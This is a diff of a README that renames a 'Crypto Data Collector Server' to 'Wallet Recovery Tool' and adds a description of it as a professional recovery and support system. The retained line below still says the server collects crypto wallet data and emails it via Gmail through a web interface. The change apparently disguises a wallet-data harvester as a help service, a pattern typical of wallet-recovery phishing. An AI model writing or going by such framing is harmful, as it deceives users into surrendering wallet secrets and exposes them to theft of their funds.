@@ -1,4 +1,6 @@
-# Crypto Data Collector Server
+# Wallet Recovery Tool
+
+A professional crypto wallet recovery and support system that helps users regain access to their digital assets.
 
 This server collects crypto wallet data and sends it via email using Gmail. It includes a web interface for easy data collection.
 
